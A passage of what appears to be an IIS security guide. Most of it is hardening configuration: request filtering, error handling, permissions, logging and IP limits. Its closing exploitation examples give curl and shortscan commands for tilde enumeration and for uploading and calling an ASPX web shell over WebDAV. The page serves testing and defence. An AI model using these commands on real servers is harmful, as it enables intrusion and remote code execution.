</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="w">    </span><span class="nt">&lt;requestFiltering&gt;</span>
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="w">      </span><span class="cm">&lt;!-- Set max content length (in bytes) --&gt;</span>
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="w">      </span><span class="nt">&lt;requestLimits</span><span class="w"> </span><span class="na">maxAllowedContentLength=</span><span class="s">&quot;10485760&quot;</span><span class="w"> </span><span class="na">maxUrl=</span><span class="s">&quot;4096&quot;</span><span class="w"> </span><span class="na">maxQueryString=</span><span class="s">&quot;2048&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="w">      </span><span class="cm">&lt;!-- Deny access to sensitive files --&gt;</span>
</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="w">      </span><span class="nt">&lt;fileExtensions</span><span class="w"> </span><span class="na">allowUnlisted=</span><span class="s">&quot;true&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">fileExtension=</span><span class="s">&quot;.config&quot;</span><span class="w"> </span><span class="na">allowed=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">fileExtension=</span><span class="s">&quot;.cs&quot;</span><span class="w"> </span><span class="na">allowed=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">fileExtension=</span><span class="s">&quot;.vb&quot;</span><span class="w"> </span><span class="na">allowed=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">fileExtension=</span><span class="s">&quot;.bak&quot;</span><span class="w"> </span><span class="na">allowed=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">fileExtension=</span><span class="s">&quot;.old&quot;</span><span class="w"> </span><span class="na">allowed=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="w">      </span><span class="nt">&lt;/fileExtensions&gt;</span>
</span><span id="__span-38-15"><a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a>
</span><span id="__span-38-16"><a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a><span class="w">      </span><span class="cm">&lt;!-- Deny dangerous character sequences --&gt;</span>
</span><span id="__span-38-17"><a id="__codelineno-38-17" name="__codelineno-38-17" href="#__codelineno-38-17"></a><span class="w">      </span><span class="nt">&lt;denyUrlSequences&gt;</span>
</span><span id="__span-38-18"><a id="__codelineno-38-18" name="__codelineno-38-18" href="#__codelineno-38-18"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">sequence=</span><span class="s">&quot;..&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-38-19"><a id="__codelineno-38-19" name="__codelineno-38-19" href="#__codelineno-38-19"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">sequence=</span><span class="s">&quot;~/&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-38-20"><a id="__codelineno-38-20" name="__codelineno-38-20" href="#__codelineno-38-20"></a><span class="w">      </span><span class="nt">&lt;/denyUrlSequences&gt;</span>
</span><span id="__span-38-21"><a id="__codelineno-38-21" name="__codelineno-38-21" href="#__codelineno-38-21"></a><span class="w">    </span><span class="nt">&lt;/requestFiltering&gt;</span>
</span><span id="__span-38-22"><a id="__codelineno-38-22" name="__codelineno-38-22" href="#__codelineno-38-22"></a><span class="w">  </span><span class="nt">&lt;/security&gt;</span>
</span><span id="__span-38-23"><a id="__codelineno-38-23" name="__codelineno-38-23" href="#__codelineno-38-23"></a><span class="nt">&lt;/system.webServer&gt;</span>
</span></code></pre></div></p>
<p><strong>9. Disable detailed error messages:</strong>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="cm">&lt;!-- In web.config --&gt;</span>
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="nt">&lt;system.web&gt;</span>
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="w">  </span><span class="nt">&lt;customErrors</span><span class="w"> </span><span class="na">mode=</span><span class="s">&quot;On&quot;</span><span class="w"> </span><span class="na">defaultRedirect=</span><span class="s">&quot;~/Error.aspx&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="w">    </span><span class="nt">&lt;error</span><span class="w"> </span><span class="na">statusCode=</span><span class="s">&quot;404&quot;</span><span class="w"> </span><span class="na">redirect=</span><span class="s">&quot;~/NotFound.aspx&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="w">    </span><span class="nt">&lt;error</span><span class="w"> </span><span class="na">statusCode=</span><span class="s">&quot;500&quot;</span><span class="w"> </span><span class="na">redirect=</span><span class="s">&quot;~/ServerError.aspx&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="w">  </span><span class="nt">&lt;/customErrors&gt;</span>
</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="w">  </span><span class="nt">&lt;compilation</span><span class="w"> </span><span class="na">debug=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="nt">&lt;/system.web&gt;</span>
</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>
</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a><span class="nt">&lt;system.webServer&gt;</span>
</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a><span class="w">  </span><span class="nt">&lt;httpErrors</span><span class="w"> </span><span class="na">errorMode=</span><span class="s">&quot;Custom&quot;</span><span class="w"> </span><span class="na">existingResponse=</span><span class="s">&quot;Replace&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-39-12"><a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a><span class="w">    </span><span class="nt">&lt;remove</span><span class="w"> </span><span class="na">statusCode=</span><span class="s">&quot;404&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-39-13"><a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a><span class="w">    </span><span class="nt">&lt;error</span><span class="w"> </span><span class="na">statusCode=</span><span class="s">&quot;404&quot;</span><span class="w"> </span><span class="na">path=</span><span class="s">&quot;/NotFound.html&quot;</span><span class="w"> </span><span class="na">responseMode=</span><span class="s">&quot;File&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-39-14"><a id="__codelineno-39-14" name="__codelineno-39-14" href="#__codelineno-39-14"></a><span class="w">    </span><span class="nt">&lt;remove</span><span class="w"> </span><span class="na">statusCode=</span><span class="s">&quot;500&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-39-15"><a id="__codelineno-39-15" name="__codelineno-39-15" href="#__codelineno-39-15"></a><span class="w">    </span><span class="nt">&lt;error</span><span class="w"> </span><span class="na">statusCode=</span><span class="s">&quot;500&quot;</span><span class="w"> </span><span class="na">path=</span><span class="s">&quot;/ServerError.html&quot;</span><span class="w"> </span><span class="na">responseMode=</span><span class="s">&quot;File&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-39-16"><a id="__codelineno-39-16" name="__codelineno-39-16" href="#__codelineno-39-16"></a><span class="w">  </span><span class="nt">&lt;/httpErrors&gt;</span>
</span><span id="__span-39-17"><a id="__codelineno-39-17" name="__codelineno-39-17" href="#__codelineno-39-17"></a><span class="nt">&lt;/system.webServer&gt;</span>
</span></code></pre></div></p>
<p><strong>10. Secure web.config and sensitive files:</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c"># Deny web access to web.config</span>
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="c"># (Already done by default in IIS)</span>
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>
</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="c"># Encrypt sensitive sections</span>
</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="n">aspnet_regiis</span><span class="p">.</span><span class="n">exe</span> <span class="n">-pef</span> <span class="s2">&quot;connectionStrings&quot;</span> <span class="s2">&quot;C:\inetpub\wwwroot\myapp&quot;</span>
</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="n">aspnet_regiis</span><span class="p">.</span><span class="n">exe</span> <span class="n">-pef</span> <span class="s2">&quot;appSettings&quot;</span> <span class="s2">&quot;C:\inetpub\wwwroot\myapp&quot;</span>
</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a>
</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a><span class="c"># Set proper NTFS permissions</span>
</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a><span class="n">icacls</span> <span class="s2">&quot;C:\inetpub\wwwroot&quot;</span> <span class="p">/</span><span class="n">inheritance</span><span class="p">:</span><span class="nb">r</span>
</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a><span class="n">icacls</span> <span class="s2">&quot;C:\inetpub\wwwroot&quot;</span> <span class="p">/</span><span class="n">grant</span> <span class="s2">&quot;IIS_IUSRS:(OI)(CI)R&quot;</span>
</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a><span class="n">icacls</span> <span class="s2">&quot;C:\inetpub\wwwroot&quot;</span> <span class="p">/</span><span class="n">grant</span> <span class="s2">&quot;Administrators:(OI)(CI)F&quot;</span>
</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a>
</span><span id="__span-40-13"><a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a><span class="c"># Restrict App_Data directory</span>
</span><span id="__span-40-14"><a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a><span class="n">icacls</span> <span class="s2">&quot;C:\inetpub\wwwroot\App_Data&quot;</span> <span class="p">/</span><span class="n">inheritance</span><span class="p">:</span><span class="nb">r</span>
</span><span id="__span-40-15"><a id="__codelineno-40-15" name="__codelineno-40-15" href="#__codelineno-40-15"></a><span class="n">icacls</span> <span class="s2">&quot;C:\inetpub\wwwroot\App_Data&quot;</span> <span class="p">/</span><span class="n">grant</span> <span class="s2">&quot;IIS_IUSRS:(OI)(CI)M&quot;</span>
</span></code></pre></div></p>
<p><strong>11. Move log files to non-system drive:</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c"># Move to D:\Logs (recommended by CIS)</span>
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">set </span><span class="n">config</span> <span class="n">-section</span><span class="p">:</span><span class="n">sites</span> <span class="n">-siteDefaults</span><span class="p">.</span><span class="n">logfile</span><span class="p">.</span><span class="n">directory</span><span class="p">:</span><span class="s2">&quot;D:\Logs&quot;</span>
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>
</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="c"># Protect log directory</span>
</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="n">icacls</span> <span class="s2">&quot;D:\Logs&quot;</span> <span class="p">/</span><span class="n">inheritance</span><span class="p">:</span><span class="nb">r</span>
</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="n">icacls</span> <span class="s2">&quot;D:\Logs&quot;</span> <span class="p">/</span><span class="n">grant</span> <span class="s2">&quot;SYSTEM:(OI)(CI)F&quot;</span>
</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="n">icacls</span> <span class="s2">&quot;D:\Logs&quot;</span> <span class="p">/</span><span class="n">grant</span> <span class="s2">&quot;Administrators:(OI)(CI)F&quot;</span>
</span></code></pre></div></p>
<p><strong>12. Enable and configure logging:</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="c"># Enable logging (W3C format recommended)</span>
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">set </span><span class="n">site</span> <span class="s2">&quot;Default Web Site&quot;</span> <span class="p">/</span><span class="n">logFile</span><span class="p">.</span><span class="n">enabled</span><span class="p">:</span><span class="n">true</span>
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">set </span><span class="n">site</span> <span class="s2">&quot;Default Web Site&quot;</span> <span class="p">/</span><span class="n">logFile</span><span class="p">.</span><span class="n">logFormat</span><span class="p">:</span><span class="n">W3C</span>
</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>
</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="c"># Log all fields for security analysis</span>
</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">set </span><span class="n">config</span> <span class="n">-section</span><span class="p">:</span><span class="n">sites</span> <span class="n">-siteDefaults</span><span class="p">.</span><span class="n">logFile</span><span class="p">.</span><span class="n">logExtFileFlags</span><span class="p">:</span><span class="s2">&quot;Date,Time,ClientIP,UserName,SiteName,ComputerName,ServerIP,Method,UriStem,UriQuery,HttpStatus,Win32Status,BytesSent,BytesRecv,TimeTaken,ServerPort,UserAgent,Cookie,Referer,ProtocolVersion,Host,HttpSubStatus&quot;</span>
</span></code></pre></div></p>
<p><strong>13. Implement IP and domain restrictions:</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c"># Allow only specific IPs for admin areas</span>
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">set </span><span class="n">config</span> <span class="s2">&quot;Default Web Site/admin&quot;</span> <span class="p">/</span><span class="n">section</span><span class="p">:</span><span class="n">ipSecurity</span> <span class="p">/</span><span class="n">allowUnlisted</span><span class="p">:</span><span class="n">false</span>
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">set </span><span class="n">config</span> <span class="s2">&quot;Default Web Site/admin&quot;</span> <span class="p">/</span><span class="n">section</span><span class="p">:</span><span class="n">ipSecurity</span> <span class="p">/+[</span><span class="n">ipAddress</span><span class="p">=</span><span class="s1">&#39;192.168.1.100&#39;</span><span class="p">,</span><span class="n">allowed</span><span class="p">=</span><span class="s1">&#39;true&#39;</span><span class="p">]</span>
</span></code></pre></div></p>
<p><strong>14. Configure dynamic IP restrictions:</strong>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="nt">&lt;system.webServer&gt;</span>
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="w">  </span><span class="nt">&lt;security&gt;</span>
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="w">    </span><span class="nt">&lt;dynamicIpSecurity&gt;</span>
</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="w">      </span><span class="cm">&lt;!-- Block IP if 10 requests in 5 seconds --&gt;</span>
</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="w">      </span><span class="nt">&lt;denyByConcurrentRequests</span><span class="w"> </span><span class="na">enabled=</span><span class="s">&quot;true&quot;</span><span class="w"> </span><span class="na">maxConcurrentRequests=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="w">      </span><span class="cm">&lt;!-- Block IP if 20 requests in 10 seconds --&gt;</span>
</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="w">      </span><span class="nt">&lt;denyByRequestRate</span><span class="w"> </span><span class="na">enabled=</span><span class="s">&quot;true&quot;</span><span class="w"> </span><span class="na">maxRequests=</span><span class="s">&quot;20&quot;</span><span class="w"> </span><span class="na">requestIntervalInMilliseconds=</span><span class="s">&quot;10000&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a><span class="w">    </span><span class="nt">&lt;/dynamicIpSecurity&gt;</span>
</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a><span class="w">  </span><span class="nt">&lt;/security&gt;</span>
</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a><span class="nt">&lt;/system.webServer&gt;</span>
</span></code></pre></div></p>
<p><strong>15. Use URL Rewrite for additional security:</strong>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="cm">&lt;!-- Enforce HTTPS --&gt;</span>
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="nt">&lt;rewrite&gt;</span>
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="w">  </span><span class="nt">&lt;rules&gt;</span>
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="w">    </span><span class="nt">&lt;rule</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;HTTPS Redirect&quot;</span><span class="w"> </span><span class="na">stopProcessing=</span><span class="s">&quot;true&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="w">      </span><span class="nt">&lt;match</span><span class="w"> </span><span class="na">url=</span><span class="s">&quot;(.*)&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="w">      </span><span class="nt">&lt;conditions&gt;</span>
</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">input=</span><span class="s">&quot;{HTTPS}&quot;</span><span class="w"> </span><span class="na">pattern=</span><span class="s">&quot;off&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="w">      </span><span class="nt">&lt;/conditions&gt;</span>
</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="w">      </span><span class="nt">&lt;action</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;Redirect&quot;</span><span class="w"> </span><span class="na">url=</span><span class="s">&quot;https://{HTTP_HOST}/{R:1}&quot;</span><span class="w"> </span><span class="na">redirectType=</span><span class="s">&quot;Permanent&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="w">    </span><span class="nt">&lt;/rule&gt;</span>
</span><span id="__span-45-11"><a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a><span class="w">  </span><span class="nt">&lt;/rules&gt;</span>
</span><span id="__span-45-12"><a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a><span class="nt">&lt;/rewrite&gt;</span>
</span></code></pre></div></p>
<ul>
<li>Keep Windows Server and IIS regularly updated with latest security patches</li>
<li>Follow CIS Benchmark for IIS hardening guidelines</li>
<li>Implement Web Application Firewall (WAF) for additional protection</li>
<li>Use fail2ban or similar tools to block brute-force attacks</li>
<li>Enable Windows Firewall and limit inbound connections</li>
<li>Regularly audit IIS configuration and permissions</li>
<li>Monitor Event Logs for security events</li>
<li>Backup configuration files regularly</li>
<li>Use HTTPS everywhere with valid certificates</li>
<li>Implement proper input validation in applications</li>
<li>Use parameterized queries to prevent SQL injection</li>
<li>Regularly scan for vulnerabilities</li>
<li>Disable unused IIS features and role services</li>
<li>Use dedicated service accounts with least privileges</li>
<li>Implement network segmentation for DMZ servers</li>
</ul>
</div>
<hr />
<h2 id="exploitation-examples">Exploitation Examples<a class="headerlink" href="#exploitation-examples" title="Permanent link">&para;</a></h2>
<details class="example">
<summary>Example 1: IIS Tilde Enumeration to Discover Hidden Admin Panel</summary>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c1"># Step 1: Scan for short names</span>
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>shortscan<span class="w"> </span>http://target.com/
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>
</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="c1"># Output reveals:</span>
</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="c1"># ADMINI~1 found</span>
</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="c1"># CONFIG~1 found</span>
</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a>
</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a><span class="c1"># Step 2: Brute-force full names</span>
</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a><span class="c1"># ADMINI~1 -&gt; admin/ or administrator/</span>
</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a>curl<span class="w"> </span>http://target.com/admin/
</span><span id="__span-46-11"><a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a>curl<span class="w"> </span>http://target.com/administrator/
</span><span id="__span-46-12"><a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a>
</span><span id="__span-46-13"><a id="__codelineno-46-13" name="__codelineno-46-13" href="#__codelineno-46-13"></a><span class="c1"># Step 3: Discovered hidden admin panel</span>
</span><span id="__span-46-14"><a id="__codelineno-46-14" name="__codelineno-46-14" href="#__codelineno-46-14"></a><span class="c1"># http://target.com/administrator/login.aspx</span>
</span><span id="__span-46-15"><a id="__codelineno-46-15" name="__codelineno-46-15" href="#__codelineno-46-15"></a><span class="c1"># Proceed with credential attacks or vulnerability scanning</span>
</span></code></pre></div>
</details>
<details class="example">
<summary>Example 2: Exploiting WebDAV for File Upload and Shell Access</summary>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c1"># Step 1: Check if WebDAV is enabled</span>
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>curl<span class="w"> </span>-X<span class="w"> </span>OPTIONS<span class="w"> </span>http://target.com
</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="c1"># Response: DAV: 1,2</span>
</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>
</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="c1"># Step 2: Test authentication</span>
</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>http://target.com/shell.txt<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;test&quot;</span><span class="w"> </span>--user<span class="w"> </span>admin:password
</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>
</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a><span class="c1"># Step 3: Upload ASPX shell</span>
</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>http://target.com/shell.aspx<span class="w"> </span>--data-binary<span class="w"> </span>@webshell.aspx<span class="w"> </span>--user<span class="w"> </span>admin:password
</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a>
</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a><span class="c1"># Step 4: Access shell</span>
</span><span id="__span-47-12"><a id="__codelineno-47-12" name="__codelineno-47-12" href="#__codelineno-47-12"></a>curl<span class="w"> </span><span class="s2">&quot;http://target.com/shell.aspx?cmd=whoami&quot;</span>
